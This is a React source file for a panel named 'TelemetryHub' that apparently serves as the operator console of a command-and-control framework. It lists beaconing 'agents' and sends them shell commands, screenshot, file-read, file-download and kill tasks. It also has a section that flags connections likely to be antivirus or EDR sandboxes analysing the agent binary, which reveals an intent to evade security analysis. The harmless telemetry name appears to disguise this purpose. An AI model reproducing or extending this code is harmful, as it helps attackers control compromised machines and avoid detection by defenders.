/**
 * TelemetryHub - Endpoints Tab
 * Manage all connected endpoints with full details
 */

import React, { useState, useEffect } from 'react';
import '../styles/EndpointsTab.css';
import { getServerUrl } from '../utils/config';
import { getSession } from '../utils/auth';

const getApiUrl = () => getServerUrl();

// Get auth headers with session token and access key
const getAuthHeaders = () => {
  const session = getSession();
  const headers = { 'Content-Type': 'application/json' };
  if (session && session.token) {
    headers['X-Session-Token'] = session.token;
  }
  if (session && session.accessKey) {
    headers['X-Access-Key'] = session.accessKey;
  }
  return headers;
};

// SVG Icons
const Icons = {
  terminal: (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <polyline points="4 17 10 11 4 5"/>
      <line x1="12" y1="19" x2="20" y2="19"/>
    </svg>
  ),
  alert: (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
      <line x1="12" y1="9" x2="12" y2="13"/>
      <line x1="12" y1="17" x2="12.01" y2="17"/>
    </svg>
  ),
  windows: (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
      <path d="M3 5.548l7.19-0.99v6.942H3V5.548zm0 12.904l7.19 0.99v-6.942H3v5.952zm8.19 1.098L21 21V13.5h-9.81v6.05zm0-14.1v6.05H21V3l-9.81 1.45z"/>
    </svg>
  ),
  linux: (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 2C8.5 2 6 5.5 6 9c0 2.5 1 4.5 2.5 6L7 18c-1 .5-1.5 1.5-1 2.5.5 1.5 2 2 3.5 1.5l.5-.2c.7.1 1.3.2 2 .2s1.3-.1 2-.2l.5.2c1.5.5 3 0 3.5-1.5.5-1-.5-2-1-2.5l-1.5-3c1.5-1.5 2.5-3.5 2.5-6 0-3.5-2.5-7-6-7zm-2 7c-.5 0-1-.5-1-1s.5-1 1-1 1 .5 1 1-.5 1-1 1zm4 0c-.5 0-1-.5-1-1s.5-1 1-1 1 .5 1 1-.5 1-1 1z"/>
    </svg>
  ),
  apple: (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
      <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
    </svg>
  ),
  computer: (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <rect x="2" y="3" width="20" height="14"/>
      <line x1="8" y1="21" x2="16" y2="21"/>
      <line x1="12" y1="17" x2="12" y2="21"/>
    </svg>
  ),
  plus: (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <line x1="12" y1="5" x2="12" y2="19"/>
      <line x1="5" y1="12" x2="19" y2="12"/>
    </svg>
  ),
  trash: (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <polyline points="3 6 5 6 21 6"/>
      <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
    </svg>
  ),
};

const EndpointsTab = ({ endpoints, selectedEndpoint, setSelectedEndpoint, setActiveTab, loadEndpoints }) => {
  const [searchTerm, setSearchTerm] = useState('');
  const [filterOS, setFilterOS] = useState('all');
  const [filterStatus, setFilterStatus] = useState('all');
  const [showRequestModal, setShowRequestModal] = useState(false);
  const [requestInput, setRequestInput] = useState('');
  const [requestType, setRequestType] = useState('shell');
  const [requestStatus, setRequestStatus] = useState('');
  const [showKillConfirm, setShowKillConfirm] = useState(false);
  const [showClearAllConfirm, setShowClearAllConfirm] = useState(false);
  const [suspiciousAgents, setSuspiciousAgents] = useState([]);
  const [showSuspicious, setShowSuspicious] = useState(true);

  // Fetch suspicious agents periodically
  useEffect(() => {
    const fetchSuspicious = async () => {
      try {
        const response = await fetch(`${getApiUrl()}/api/endpoints/suspicious`, {
          headers: getAuthHeaders()
        });
        if (response.ok) {
          const data = await response.json();
          setSuspiciousAgents(data.suspicious_agents || []);
        }
      } catch (error) {
        console.error('Failed to fetch suspicious agents:', error);
      }
    };

    fetchSuspicious();
    const interval = setInterval(fetchSuspicious, 5000); // Poll every 5 seconds
    return () => clearInterval(interval);
  }, []);

  // Clear all suspicious agents
  const handleClearSuspicious = async () => {
    try {
      const response = await fetch(`${getApiUrl()}/api/endpoints/suspicious/clear`, {
        method: 'POST',
        headers: getAuthHeaders()
      });
      if (response.ok) {
        setSuspiciousAgents([]);
      }
    } catch (error) {
      console.error('Failed to clear suspicious agents:', error);
    }
  };

  const filtered = endpoints.filter(endpoint => {
    const matchesSearch = !searchTerm ||
      endpoint.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (endpoint.hostname && endpoint.hostname.toLowerCase().includes(searchTerm.toLowerCase()));

    const matchesOS = filterOS === 'all' ||
      (endpoint.os && endpoint.os.toLowerCase() === filterOS.toLowerCase());

    const matchesStatus = filterStatus === 'all' || endpoint.status === filterStatus;

    return matchesSearch && matchesOS && matchesStatus;
  });

  const getOSIcon = (os) => {
    const osLower = os?.toLowerCase();
    if (osLower === 'windows') return Icons.windows;
    if (osLower === 'linux') return Icons.linux;
    if (osLower === 'macos' || osLower === 'darwin') return Icons.apple;
    return Icons.computer;
  };

  const getStatusClass = (status) => {
    return status?.toLowerCase() || 'dead';
  };

  const selectEndpoint = (endpoint) => {
    setSelectedEndpoint(endpoint);
  };

  // Send task to endpoint
  const sendTask = async (type, args = '') => {
    if (!selectedEndpoint) return;

    try {
      setRequestStatus('Sending...');

      // Base64 encode args for the ref name
      const argsB64 = args ? btoa(args) : '';

      const response = await fetch(`${getApiUrl()}/api/tasks`, {
        method: 'POST',
        headers: getAuthHeaders(),
        body: JSON.stringify({
          type: type,
          args: argsB64 ? [argsB64] : [],
          endpoint_id: selectedEndpoint.id
        })
      });

      if (response.ok) {
        const data = await response.json();
        setRequestStatus(`Task queued: ${data.id}`);
        setTimeout(() => setRequestStatus(''), 3000);
      } else {
        setRequestStatus('Failed to send task');
      }
    } catch (error) {
      setRequestStatus(`Error: ${error.message}`);
    }
  };

  // Quick action handlers
  const handleExecuteTask = () => {
    setShowRequestModal(true);
  };

  const handleSendTask = () => {
    if (requestInput.trim()) {
      sendTask(requestType, requestInput);
      setShowRequestModal(false);
      setRequestInput('');
    }
  };

  const handleSysinfo = () => sendTask('sysinfo');
  const handleWhoami = () => sendTask('whoami');
  const handleHostname = () => sendTask('hostname');
  const handleScreenshot = () => sendTask('screenshot');
  const handleProcessList = () => sendTask('ps');
  const handleStopEndpoint = () => {
    if (!selectedEndpoint) return;
    setShowKillConfirm(true);
  };

  const confirmKillAgent = async () => {
    setShowKillConfirm(false);
    if (!selectedEndpoint) return;

    try {
      // Get the endpoint's sleep interval (default 3 seconds if not set)
      const sleepInterval = (selectedEndpoint.sleep_interval || 3) * 1000;
      // Wait for 2x sleep interval + buffer to ensure agent receives kill task
      const waitTime = Math.max(sleepInterval * 2 + 2000, 5000);

      setRequestStatus(`Sending kill task (waiting ${Math.round(waitTime/1000)}s for agent to poll)...`);

      // Send kill task to stop the endpoint process and cleanup
      await fetch(`${getApiUrl()}/api/tasks`, {
        method: 'POST',
        headers: getAuthHeaders(),
        body: JSON.stringify({
          type: 'kill',
          args: [],
          endpoint_id: selectedEndpoint.id
        })
      });

      // Wait for endpoint to poll and receive the kill task
      await new Promise(resolve => setTimeout(resolve, waitTime));

      // Delete the endpoint from server's tracking
      const deleteResponse = await fetch(`${getApiUrl()}/api/endpoints/${selectedEndpoint.id}`, {
        method: 'DELETE',
        headers: getAuthHeaders()
      });

      if (deleteResponse.ok) {
        setRequestStatus('Endpoint stopped and removed');
        setSelectedEndpoint(null);
        // Refresh endpoints list
        if (loadEndpoints) loadEndpoints();
      } else {
        setRequestStatus('Failed to remove endpoint');
      }

      setTimeout(() => setRequestStatus(''), 3000);
    } catch (error) {
      setRequestStatus(`Error: ${error.message}`);
      setTimeout(() => setRequestStatus(''), 3000);
    }
  };

  // Endpoint info is now gathered automatically on first connection
  // No need to auto-request sysinfo - it's sent by the endpoint on startup

  // Clear all endpoints and data
  const handleClearAll = () => {
    setShowClearAllConfirm(true);
  };

  const confirmClearAll = async () => {
    setShowClearAllConfirm(false);
    try {
      // Calculate max wait time based on largest sleep interval among endpoints
      const maxSleepInterval = Math.max(...endpoints.map(e => (e.sleep_interval || 3) * 1000), 3000);
      const waitTime = Math.max(maxSleepInterval * 2 + 2000, 5000);

      setRequestStatus('Sending stop to all endpoints...');

      // Send kill task to ALL connected endpoints
      for (const endpoint of endpoints) {
        await fetch(`${getApiUrl()}/api/tasks`, {
          method: 'POST',
          headers: getAuthHeaders(),
          body: JSON.stringify({
            type: 'kill',
            args: [],
            endpoint_id: endpoint.id
          })
        });
      }

      // Wait for endpoints to poll and receive kill tasks
      setRequestStatus(`Waiting for endpoints to stop (${Math.round(waitTime/1000)}s)...`);
      await new Promise(resolve => setTimeout(resolve, waitTime));

      // Now clear the server database
      setRequestStatus('Clearing server data...');
      const response = await fetch(`${getApiUrl()}/api/clear`, {
        method: 'POST',
        headers: getAuthHeaders()
      });

      if (response.ok) {
        setRequestStatus('All endpoints stopped and data cleared');
        setSelectedEndpoint(null);
        if (loadEndpoints) loadEndpoints();
      } else {
        setRequestStatus('Failed to clear data');
      }
      setTimeout(() => setRequestStatus(''), 3000);
    } catch (error) {
      setRequestStatus(`Error: ${error.message}`);
      setTimeout(() => setRequestStatus(''), 3000);
    }
  };

  return (
    <div className="endpoints-tab">
      <div className="page-header">
        <h1 className="page-title">
          <span className="title-icon">{Icons.terminal}</span>
          Connected Agents
        </h1>
        <div className="page-actions">
          <button className="btn btn-clear-all" onClick={handleClearAll} title="Clear all endpoints and data">
            {Icons.trash}
            <span>Clear All</span>
          </button>
        </div>
      </div>

      <div className="filters-bar">
        <div className="search-box">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <circle cx="11" cy="11" r="8"/>
            <path d="m21 21-4.35-4.35"/>
          </svg>
          <input
            type="text"
            placeholder="Search Agents..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
        </div>

        <select value={filterOS} onChange={(e) => setFilterOS(e.target.value)} className="filter-select">
          <option value="all">All OS</option>
          <option value="windows">Windows</option>
          <option value="linux">Linux</option>
          <option value="macos">macOS</option>
        </select>

        <select value={filterStatus} onChange={(e) => setFilterStatus(e.target.value)} className="filter-select">
          <option value="all">All Status</option>
          <option value="active">Active</option>
          <option value="sleeping">Sleeping</option>
          <option value="dead">Dead</option>
        </select>

        <div className="endpoint-count">
          {filtered.length} / {endpoints.length} Agents
        </div>
      </div>

      {/* Suspicious Agents Section - Possible Scanners/Sandboxes */}
      {suspiciousAgents.length > 0 && (
        <div className="suspicious-section">
          <div className="suspicious-header" onClick={() => setShowSuspicious(!showSuspicious)}>
            <div className="suspicious-title">
              <span className="suspicious-icon">{Icons.alert}</span>
              <span>Possible Scanners / Sandbox ({suspiciousAgents.length})</span>
            </div>
            <div className="suspicious-actions">
              <button
                className="btn btn-clear-suspicious"
                onClick={(e) => { e.stopPropagation(); handleClearSuspicious(); }}
                title="Clear all suspicious agents"
              >
                {Icons.trash}
                <span>Clear</span>
              </button>
              <span className="expand-icon">{showSuspicious ? '▼' : '▶'}</span>
            </div>
          </div>
          {showSuspicious && (
            <div className="suspicious-list">
              <div className="suspicious-hint">
                These connections haven't completed the lifecycle (beacon count or lifetime too low).
                They may be AV/EDR sandboxes analyzing the agent binary. Auto-expires after 5 minutes.
              </div>
              <div className="suspicious-grid">
                {suspiciousAgents.map(agent => (
                  <div key={agent.id} className="suspicious-card">
                    <div className="suspicious-card-header">
                      <span className="suspicious-id font-mono">{agent.id.substring(0, 16)}</span>
                      <span className="suspicious-state">Pending</span>
                    </div>
                    <div className="suspicious-card-body">
                      <div className="suspicious-info">
                        <span className="label">Hostname:</span>
                        <span className="value font-mono">{agent.hostname || 'Unknown'}</span>
                      </div>
                      <div className="suspicious-info">
                        <span className="label">IP:</span>
                        <span className="value font-mono">{agent.ip_address || 'Unknown'}</span>
                      </div>
                      <div className="suspicious-info">
                        <span className="label">User:</span>
                        <span className="value font-mono">{agent.user || 'Unknown'}</span>
                      </div>
                      <div className="suspicious-info">
                        <span className="label">Beacons:</span>
                        <span className="value">{agent.beacon_count} / 2</span>
                      </div>
                      <div className="suspicious-info">
                        <span className="label">Lifetime:</span>
                        <span className="value">{Math.round(agent.lifetime_seconds || 0)}s / 30s</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      <div className="endpoints-content">
        <div className="endpoints-list">
          {filtered.length === 0 ? (
            <div className="empty-state">
              <div className="empty-icon">{Icons.terminal}</div>
              <div className="empty-title">No Agents Found</div>
              <div className="empty-text">
                {endpoints.length === 0
                  ? 'No Agents Have Connected Yet. Create An Agent To Get Started.'
                  : 'No Agents Match Your Filters.'}
              </div>
            </div>
          ) : (
            <div className="endpoint-cards">
              {filtered.map(endpoint => (
                <div
                  key={endpoint.id}
                  className={`endpoint-card ${selectedEndpoint?.id === endpoint.id ? 'selected' : ''}`}
                  onClick={() => selectEndpoint(endpoint)}
                >
                  <div className="endpoint-card-header">
                    <div className="endpoint-os">{getOSIcon(endpoint.os)}</div>
                    <div className="endpoint-id font-mono">{endpoint.id}</div>
                    <div className={`endpoint-status-badge ${endpoint.status || 'inactive'}`}>
                      <div className="status-dot"></div>
                      <span>{endpoint.status === 'active' ? 'Active' : 'Inactive'}</span>
                    </div>
                  </div>

                  <div className="endpoint-card-body">
                    <div className="endpoint-info-row">
                      <span className="info-label" style={{fontSize: '10px'}}>Hostname:</span>
                      <span className="info-value font-mono" style={{fontSize: '11px'}}>{endpoint.hostname || endpoint.id}</span>
                    </div>
                    <div className="endpoint-info-row">
                      <span className="info-label" style={{fontSize: '10px'}}>IP:</span>
                      <span className="info-value font-mono" style={{fontSize: '11px'}}>{endpoint.ip_address || 'N/A'}</span>
                    </div>
                    <div className="endpoint-info-row">
                      <span className="info-label" style={{fontSize: '10px'}}>User:</span>
                      <span className="info-value font-mono" style={{fontSize: '11px'}}>{endpoint.user || 'N/A'}</span>
                    </div>
                    <div className="endpoint-info-row">
                      <span className="info-label" style={{fontSize: '10px'}}>Last Seen:</span>
                      <span className="info-value" style={{fontSize: '11px'}}>
                        {endpoint.last_seen ? new Date(endpoint.last_seen).toLocaleString() : 'N/A'}
                      </span>
                    </div>
                  </div>

                  <div className="endpoint-card-footer">
                    <button
                      className="btn-console"
                      onClick={(e) => { e.stopPropagation(); setActiveTab('console'); }}
                    >
                      Open Console
                    </button>
                    <button
                      className="btn-details"
                      onClick={(e) => { e.stopPropagation(); selectEndpoint(endpoint); }}
                    >
                      Details →
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {selectedEndpoint && (
          <div className="endpoint-details">
            <div className="details-header">
              <h3 className="details-title">Agent Details</h3>
              <button className="btn-close" onClick={() => setSelectedEndpoint(null)}>×</button>
            </div>

            <div className="details-body">
              <div className="detail-section">
                <h4 className="section-title">System Information</h4>
                <div className="detail-grid">
                  <div className="detail-item">
                    <div className="detail-label">Operating System</div>
                    <div className="detail-value">{selectedEndpoint.os || 'Unknown'}</div>
                  </div>
                  <div className="detail-item">
                    <div className="detail-label">Hostname</div>
                    <div className="detail-value font-mono">{selectedEndpoint.hostname || 'N/A'}</div>
                  </div>
                  <div className="detail-item">
                    <div className="detail-label">IP Address</div>
                    <div className="detail-value font-mono">{selectedEndpoint.ip_address || 'N/A'}</div>
                  </div>
                  <div className="detail-item">
                    <div className="detail-label">Username</div>
                    <div className="detail-value font-mono">{selectedEndpoint.user || 'N/A'}</div>
                  </div>
                  <div className="detail-item">
                    <div className="detail-label">Privileges</div>
                    <div className="detail-value">
                      {selectedEndpoint.elevated ? (
                        <span className="text-green">Elevated</span>
                      ) : (
                        <span className="text-yellow">Standard User</span>
                      )}
                    </div>
                  </div>
                  <div className="detail-item">
                    <div className="detail-label">Status</div>
                    <div className="detail-value">
                      <span className={`status-badge ${getStatusClass(selectedEndpoint.status)}`}>
                        <span className="status-indicator"></span>
                        {(selectedEndpoint.status || 'Unknown').charAt(0).toUpperCase() + (selectedEndpoint.status || 'Unknown').slice(1)}
                      </span>
                    </div>
                  </div>
                </div>
              </div>

              <div className="detail-section">
                <h4 className="section-title">Connection Details</h4>
                <div className="detail-grid">
                  <div className="detail-item">
                    <div className="detail-label">First Seen</div>
                    <div className="detail-value">
                      {selectedEndpoint.first_seen ? new Date(selectedEndpoint.first_seen).toLocaleString() : 'N/A'}
                    </div>
                  </div>
                  <div className="detail-item">
                    <div className="detail-label">Last Seen</div>
                    <div className="detail-value">
                      {selectedEndpoint.last_seen ? new Date(selectedEndpoint.last_seen).toLocaleString() : 'N/A'}
                    </div>
                  </div>
                </div>
              </div>

              <div className="detail-section">
                <h4 className="section-title">Actions</h4>
                <div className="action-buttons">
                  <button className="btn btn-danger" onClick={handleStopEndpoint}>Kill Agent</button>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Task Modal */}
      {showRequestModal && (
        <div className="modal-overlay" onClick={() => setShowRequestModal(false)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <h3>Execute Task</h3>
              <button className="btn-close" onClick={() => setShowRequestModal(false)}>×</button>
            </div>
            <div className="modal-body">
              <div className="form-group">
                <label className="form-label">Task Type</label>
                <select
                  className="form-input"
                  value={requestType}
                  onChange={(e) => setRequestType(e.target.value)}
                >
                  <option value="shell">Shell Task</option>
                  <option value="ls">List Directory</option>
                  <option value="cat">Read File</option>
                  <option value="cd">Change Directory</option>
                  <option value="download">Download File</option>
                </select>
              </div>
              <div className="form-group">
                <label className="form-label">
                  {requestType === 'shell' ? 'Task' :
                   requestType === 'ls' ? 'Path (optional)' :
                   requestType === 'cat' ? 'File Path' :
                   requestType === 'cd' ? 'Directory' :
                   requestType === 'download' ? 'File Path' : 'Arguments'}
                </label>
                <input
                  type="text"
                  className="form-input"
                  value={requestInput}
                  onChange={(e) => setRequestInput(e.target.value)}
                  placeholder={requestType === 'shell' ? 'whoami' : '/path/to/target'}
                  onKeyPress={(e) => e.key === 'Enter' && handleSendTask()}
                />
              </div>
            </div>
            <div className="modal-footer">
              <button className="btn btn-secondary" onClick={() => setShowRequestModal(false)}>Cancel</button>
              <button className="btn btn-primary" onClick={handleSendTask}>Execute</button>
            </div>
          </div>
        </div>
      )}

      {/* Kill Agent Confirmation Dialog */}
      {showKillConfirm && (
        <div className="modal-overlay">
          <div className="modal-dialog">
            <div className="modal-header">
              <span className="modal-icon">{Icons.alert}</span>
              <h3>Kill Agent</h3>
            </div>
            <div className="modal-body">
              <p>Are you sure you want to stop and remove this agent?</p>
              <p className="modal-hint">This will terminate the agent process on the target system.</p>
            </div>
            <div className="modal-actions">
              <button className="btn btn-secondary" onClick={() => setShowKillConfirm(false)}>
                Cancel
              </button>
              <button className="btn btn-danger" onClick={confirmKillAgent}>
                Kill Agent
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Clear All Confirmation Dialog */}
      {showClearAllConfirm && (
        <div className="modal-overlay">
          <div className="modal-dialog">
            <div className="modal-header">
              <span className="modal-icon">{Icons.alert}</span>
              <h3>Clear All Agents</h3>
            </div>
            <div className="modal-body">
              <p>Clear ALL agents and data?</p>
              <p className="modal-hint">This will stop all agents on all systems. This cannot be undone.</p>
            </div>
            <div className="modal-actions">
              <button className="btn btn-secondary" onClick={() => setShowClearAllConfirm(false)}>
                Cancel
              </button>
              <button className="btn btn-danger" onClick={confirmClearAll}>
                Clear All
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default EndpointsTab;
